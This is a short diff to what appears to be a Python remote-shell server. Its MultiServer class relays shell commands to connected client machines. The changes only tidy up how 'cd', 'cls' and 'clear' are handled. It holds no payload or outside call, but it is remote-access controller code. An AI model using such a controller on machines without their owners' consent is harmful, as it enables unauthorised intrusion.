@@ -90,6 +90,7 @@ def shell_print(data) -> None:
             print(data)
     return
 
+
 def _time() -> str:
     """ Get a filename from the current time """
     # returns str
@@ -313,13 +314,6 @@ class MultiServer(object):
         """ Remote Shell with Client """
         # returns command_output
         system = self.get_platform(conn)
-        if command.lower().strip() == 'cd':
-            cwd = self.get_cwd(conn)
-            if self.get_platform(conn) == 'Windows':
-                cwd += '\n'
-            if _print:
-                print(cwd)
-            return cwd
         split_command = command.split(' ')[0].strip().lower()
         if split_command in ['cd', 'chdir']:
             self.send(conn, json_dumps(['SHELL', command]))
@@ -331,10 +325,10 @@ class MultiServer(object):
             if _print and system == 'Windows':
                 print()
             return ''
-        if command.lower().strip() == 'cls' and self.get_platform(conn) == 'Windows':
+        if split_command == 'cls' and system == 'Windows':
             os.system('cls')
             return ''
-        if command[:5].lower().strip() == 'clear' and self.get_platform(conn) != 'Windows':
+        if split_command == 'clear' and system != 'Windows':
             os.system('clear')
             return ''
         self.send(conn, json_dumps(['SHELL', command]))
